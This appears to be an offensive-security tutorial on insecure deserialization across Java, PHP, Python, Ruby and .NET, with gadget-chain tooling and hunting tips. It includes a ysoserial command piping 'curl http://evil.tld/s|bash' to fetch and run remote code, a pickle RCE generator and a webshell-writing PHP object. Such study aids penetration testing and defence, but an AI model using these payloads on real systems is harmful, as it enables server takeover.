# Insecure Deserialization

Deserialization turns bytes back into objects. If those bytes are attacker-controlled and the language reconstructs rich objects (not just data), the reconstruction itself can trigger code: constructors, magic methods, and gadget chains that end in command execution. This is one of the most reliable paths to RCE when you find it.

## The mental model

Serialization formats fall into two camps: data-only (JSON, plain Protobuf) and object-graph (Java `Serializable`, Python pickle, PHP `serialize`, Ruby Marshal, .NET `BinaryFormatter`). The object-graph formats, when fed attacker bytes, invoke methods during reconstruction. A "gadget chain" strings together classes already present on the classpath so that deserialization triggers a sequence ending in `Runtime.exec` or equivalent. You rarely write new code; you assemble existing classes.

## Where it hides / tell-tales

- **Serialized blobs in transport**: base64 that decodes to a recognizable magic prefix. Java `rO0` (base64 of `0xAC ED 00 05`), PHP `O:8:"stdClass"`, Python pickle opcodes (`\x80\x04` and friends), Ruby Marshal `\x04\x08`, .NET `AAEAAAD/////`.
- **Where blobs live**: cookies and session tokens, hidden form fields (`ViewState` in .NET), `Authorization`-adjacent headers, cache entries, message queue payloads, `java.rmi`, caching layers, and any "state" passed round-trip to the client.
- **Framework fingerprints**: `JSESSIONID` plus a serialized cookie (Java), `__VIEWSTATE` (ASP.NET), `_rails_session`/Marshal (Ruby), Django pickle sessions (if misconfigured), Python apps using `pickle.loads` on user data.
- **"We send you your state back"**: any feature that hands you an opaque blob and later accepts it is a candidate; decode it and identify the format.

## Real material

Recognizing formats by decoded prefix:

```
Java:   base64 starts "rO0AB"    (bytes AC ED 00 05)
PHP:    O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
Python: b"\x80\x04\x95...."      (pickle protocol 4)
Ruby:   "\x04\bo:..."            (Marshal)
.NET:   "AAEAAAD/////AQAAAAAAAAAM"  (BinaryFormatter) or __VIEWSTATE
```

PHP object injection (POP chain). You control a serialized object; a `__destruct`/`__wakeup` magic method does something dangerous:

```php
// If a class does file ops in __destruct using its properties:
O:10:"LogManager":1:{s:7:"logFile";s:20:"/var/www/html/x.php";}
// combined with controllable content -> write a webshell
```

Java gadget chains are generated with `ysoserial`. You pick the chain matching a library on the classpath:

```
java -jar ysoserial.jar CommonsCollections6 'curl http://evil.tld/s|bash' | base64
# place the base64 where the app deserializes (cookie, param, RMI, etc.)
```
Common chains map to libraries: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1/2`, `Hibernate1`, `JRMPClient`, `Jdk7u21`. Fingerprint the dependencies, then choose.

Python pickle RCE (pickle can call any callable on load via `__reduce__`):

```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(E())).decode())
# feed to any pickle.loads(user_input)
```

.NET `ViewState` without a validated MAC, or with a known/leaked `machineKey`, is deserialization RCE via `ysoserial.net` (`TypeConfuseDelegate`, `TextFormattingRunProperties`).

## Beyond the basics

- **Classpath-driven chain selection**: the chain only works if its gadget library is present. Fingerprint dependencies (error messages, JS/HTML comments, known endpoints, `/WEB-INF/lib`, version banners) and pick the matching `ysoserial` payload. Spraying all chains is noisy and often fails; targeted selection works.
- **Detection without RCE**: if you cannot land a chain, prove deserialization with a DNS/HTTP callback gadget (`URLDNS` for Java triggers a DNS lookup on deserialization with no dependency requirement). A callback confirms the sink even on a hardened classpath.
- **Blind and delayed**: the deserialization may happen in a background worker or a different service that consumes a queue. Your payload fires minutes later and elsewhere; use OOB callbacks to detect, and think about where the blob travels.
- **.NET beyond BinaryFormatter**: `Json.NET` with `TypeNameHandling.All`, `DataContractSerializer`, `LosFormatter`/`ObjectStateFormatter` (ViewState), and `BinaryFormatter`. The tell is a `$type` field in JSON (`{"$type":"System...","..."}`) which means polymorphic deserialization and likely gadgets.
- **Java alternatives to native**: `XMLDecoder` (executes on parse, trivial RCE), `SnakeYAML` (`!!javax.script...` and `ScriptEngine` gadgets), `Jackson` polymorphic typing (`@JsonTypeInfo` / default typing enabling `JNDI` gadgets), `fastjson` (`@type` autotype to JNDI/JdbcRowSet). JSON is not automatically safe once polymorphic typing is on.
- **JNDI injection bridge**: many modern chains (Jackson, fastjson, log4shell-style) end by making the server do a JNDI lookup to your LDAP/RMI server, which returns a malicious class. Run a JNDI exploit server; this is the 2020s-era replacement for classic native chains.
- **PHP POP chain building**: without a prebuilt tool, enumerate classes with magic methods (`__destruct`, `__wakeup`, `__toString`, `__call`) in the codebase (if source is available) and chain their side effects. `phpggc` generates chains for common frameworks (Laravel, Symfony, WordPress, Monolog).

## What to watch for

- A serialized blob that is MAC-signed or encrypted is not directly injectable unless you also have the key; check for integrity protection first (ViewState MAC, signed cookies). A leaked `machineKey`/secret changes everything.
- `URLDNS` confirming a lookup proves deserialization but not RCE; the classpath may lack exec gadgets. Report accurately.
- RCE payloads execute on the server; use harmless commands and OOB callbacks for proof, and do not pivot without authorization.
- Blind/queue-based sinks can fire on infrastructure you did not intend to touch; be conservative.

## Hunting checklist

- Decode every opaque blob; identify the format by magic prefix.
- Check for integrity protection (MAC/signature/encryption) before attempting injection.
- Fingerprint the backend language and dependency versions to choose a gadget chain.
- Confirm the sink with a no-dependency callback gadget (`URLDNS`, DNS/HTTP) before chasing RCE.
- For JSON, look for polymorphic typing tells (`$type`, `@type`, `@class`) enabling gadget attacks.
- Use `ysoserial`, `ysoserial.net`, `phpggc` matched to the stack; for modern Java/JSON, stand up a JNDI exploit server.
